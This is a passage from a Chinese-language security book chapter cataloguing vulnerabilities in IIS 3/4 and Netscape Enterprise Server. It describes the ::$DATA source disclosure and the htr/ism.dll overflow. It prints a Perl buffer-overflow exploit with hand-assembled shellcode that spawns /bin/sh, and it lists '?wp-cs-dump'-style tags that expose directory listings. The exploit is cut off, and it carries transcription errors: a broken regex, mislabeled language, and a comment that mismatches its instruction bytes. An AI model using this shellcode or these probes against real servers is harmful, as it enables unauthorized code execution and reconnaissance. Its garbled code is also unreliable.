
## 受影响对象
`IIS v.3/4`。

## 入侵方式
URL 及其包含的数据形成称为流的对象。通常，数据流通过引用关联的文件名来访问，进一步命名的流对应于 `文件名:流名`。该漏洞与未命名数据流有关，可以使用 `文件名::$DATA` 来访问。黑客可以打开 `www.target.com/file.asp::$DATA`，并看到 ASP 代码的源代码，而不是输出。

### 特洛伊上传

**概述：** 黑客可以在易受攻击的 `IIS` 守护程序上执行主观编码。

**黑客状态：** 未授权访问和代码执行。

**受影响对象：** `IIS v.4`

**入侵方式：** 守护程序的缓冲区被编程为预留系统内存以处理传入数据。当程序接收到异常大量的数据时，这可能导致“缓冲区溢出”事件。`IIS 4.0` `htr/ism.dll` 代码中存在远程可利用的缓冲区溢出问题。目前，互联网上超过 85% 的 `IIS` Web 服务器守护程序易受攻击，方法是将调试器的指令指针 `eip` 重定向到加载的 `dll` 的地址。有关更多信息，请参阅 `ftp://ftp.technotronic.com/microsoft/ishack.asm`。

## Netscape Enterprise Server

作为可伸缩的 Web 服务器守护程序，`Netscape Enterprise Server`（`www.netscape.com/enterprise`）经常针对大型 Web 站点进行营销（见图 9.9）。被 PC Magazine 评为 1998 年最佳产品，此 Web 守护程序套件正驱动着互联网上一些最大的电子商务、ISP 和门户 Web 站点。引用的企业服务器站点包括 `E*Trade` (`www.etrade.com`)、`Schwab` (`www.schwab.com`)、`Digex` (`www.digex.com`)、`Excite` (`www.excite.com`) 和 `Lycos` (`www.lycos.com`)。通过提供故障切换、自动恢复、动态日志等功能

![Netscape Enterprise Server Manager](img/ba85bb40c695c02adae8cbd6666f2e0c_494_0.png)

图 9.9 Netscape 企业服务器管理器。

借助轮换机制和内容安全特性，`Netscape` 企业服务器的应用已成为一项广泛的商业成功。

## 潜在风险

### 缓冲区溢出

**概要：** 旧版本的 `Netscape` 可能容易受到缓冲区溢出攻击。

**攻击状态：** 缓冲区溢出。

**易受攻击版本：** 早先的 UNIX 版本。

**突破方式：** 以下 CGI 脚本最初由黑客/程序员 Dan Brumleve 编写，可用于测试较老 UNIX 版本的缓冲区溢出完整性：

这业务非常棘手。`Netscape` 将不可打印字符 `0x80 - 0x90`，可能还有其他，映射为 `0x3f` `('?')`，因此机器代码必须不包含这些字符。这使得调用 `int 0x80` 变得不可能，因此我将 `int 0x40` 放在那里，并编写了代码在调用前将这些字节向左移位。此外，由于 C 语言字符串约定，不能使用空字符。以下代码的第一段将第二段中的 `int 0x40` 转换为 `int 0x80`。第二段代码使 `SIGALRM` 处理程序失效。

```c
sub parse {
	join("", map { /^ [0-9A-Fa-f] ( 2 ) S/ ? pack ("c", hex ($_)) : "" } @_ );
}

my $pre = parse qw{
31 c0 # xorl $eax,$eax
66 b8 ff 0f # movw $0x1056,$ax
01 c4 # addl $eax,$esp
c0 24 24 01 # shlb $1,($esp)
29 c4 # subl $eax,$esp

31 c0 b0 30
31 db b3 0e
31 c9 b1 01
cd 40
} ;

my $code = $pre . parse qw{
b0 55 # movb $0x55,$al (marker)
eb 58 # (jump below)

5e # popl $esi

56 # pushl $esi
5b # popl $ebx
43 43 43 43 43
43 43 43 43 43 # addl $0xb,$ebx

21 33 # andl $esi,(%ebx)
09 33 # orl $esi,(%ebx)

31 c0 # xorl $eax,$eax
66 b8 56 10 # movw $0x1056,$ax
01 c4 # addl $eax,$esp
c0 24 24 01 # shlb $1,($esp)
33 c0 # xorl $eax,$eax
b0 05 # movb $5,$al
01 c4 # addl $eax,$esp
c0 24 24 01 # shlb $1,($esp)
29 c4 # subl $eax,$esp
66 b8 56 10 # movw $0x1056,$ax
29 c4 # subl $eax,$esp

31 d2 # xorl $edx,$edx
21 56 07 # andl $edx,0x7($esi)
21 56 0f # andl $edx,0xf($esi)
b8 1b 56 34 12 # movl $0x1234561b,$eax
35 10 56 34 12 # xorl $0x12345610,$eax

21 d9 # andl $ebx,$ecx
09 d9 # orl $ebx,$ecx

4b 4b 4b 4b 4b 4b
4b 4b 4b 4b 4b # subl $0xb,$ebx

cd 40 # int $0x80
31 c0 # xorl $eax,$eax
40                # incl \seax
cd 40               # int $0x80

e8 a3 ff ff ff      # (call above)
} ;

$code .= "/bin/sh";

my $transmission = parse qw{
6f 63 65 61 6e 20 64 65 73 65 72 74 20 69 72 6f 6e # inguz
20 66 65 72 74 69 6c 69 7a 61 74 69 6f 6e 20 70 68 # inguz
79 74 6f 70 6c 6e 6b 74 6f 6e 20 62 6c 6f 6d 6d # inguz
20 67 61 74 65 73 20 73 6f 76 65 72 65 65 67 74 # inguz
79
} ;

my $nop = "\ x90"; # this actually gets mapped onto 0x3f, but it doesn't seem to matter

my $address = "\x10\xdb\xff\xbf"; # wild guess, intended to be some where in the chunk of nops. works on every linux box i've tried it on so far.

my $len = 0x1000 - length($pre);
my $exploit = ($nop x 1138) . ($address x 3) . ($nop x $len) . $code ;
# the first $address is in the string replaces another
# pointer in the same function which gets dereferenced
# after the buffer is overflowed. there must be a valid
# address there or it will segfault early.

print <
```

## 结构探测

**概要：** 可以利用 `Netscape` 企业服务器在探测阶段显示目录和子目录列表，从而集中进行基于 Web 的攻击。

**攻击状态：** 探测。

**易受攻击版本：** `Netscape` 企业服务器 `3x/4`。

**突破方式：** 如果启用了“Web Publishing” Web 发布功能，黑客操纵特定标签即可突破 `Netscape` 企业服务器，从而显示目录和子目录列表：

```
http://www.example.com/?wp-cs-dump
```

这将显示该 Web 服务器根目录的内容。此外，还可以获取子目录的内容。其他可利用的标签包括：

- `?wp-ver-info`
- `?wp-htm1-rend`
- `?wp-usr-prop`
- `?wp-ver-diff`
- `?wp-verify-link`
- `?wp-start-ver`
- `?wp-stop-ver`
- `?wp-uncheckout`

# Novell Web 服务器
